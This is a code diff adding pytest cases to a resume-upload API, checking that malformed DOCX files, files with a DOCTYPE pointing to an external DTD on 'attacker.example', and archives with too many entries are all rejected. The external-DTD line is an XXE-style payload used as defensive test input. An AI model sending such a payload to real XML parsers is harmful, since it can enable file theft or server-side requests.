@@ -254,6 +254,51 @@ def test_upload_rejects_malformed_docx(resume_client, resume_users):
     assert wrong_position.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY
 
 
+def test_upload_rejects_docx_with_malformed_xml(resume_client, resume_users):
+    owner, _ = resume_users
+    malformed = docx_bytes(
+        content_types=CONTENT_TYPES_XML,
+        document='<?xml version="1.0" encoding="UTF-8" standalone="yes"?><w:document',
+    )
+    response = upload(
+        resume_client, owner, filename="broken-xml.docx", data=malformed
+    )
+    assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY
+
+
+def test_upload_rejects_docx_with_doctype_or_entity(
+    resume_client, resume_users
+):
+    owner, _ = resume_users
+    smuggled = docx_bytes(
+        content_types=CONTENT_TYPES_XML,
+        document=(
+            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
+            '<!DOCTYPE w:document SYSTEM "https://attacker.example/evil.dtd">'
+            + DOCUMENT_XML.split("?>", 1)[1]
+        ),
+    )
+    response = upload(
+        resume_client, owner, filename="dtd.docx", data=smuggled
+    )
+    assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY
+
+
+def test_upload_rejects_docx_above_entry_limit(resume_client, resume_users):
+    owner, _ = resume_users
+    with_extra_entries = io.BytesIO()
+    with zipfile.ZipFile(with_extra_entries, "w") as container:
+        container.writestr("[Content_Types].xml", CONTENT_TYPES_XML)
+        container.writestr("word/document.xml", DOCUMENT_XML)
+        for index in range(1, 66):
+            container.writestr(f"word/padding-{index:02d}.xml", "<w:part/>")
+    padded = with_extra_entries.getvalue()
+    response = upload(
+        resume_client, owner, filename="overflow.docx", data=padded
+    )
+    assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY
+
+
 def test_upload_rejects_docx_over_entry_limit(resume_client, resume_users):
     owner, _ = resume_users
     entries = {
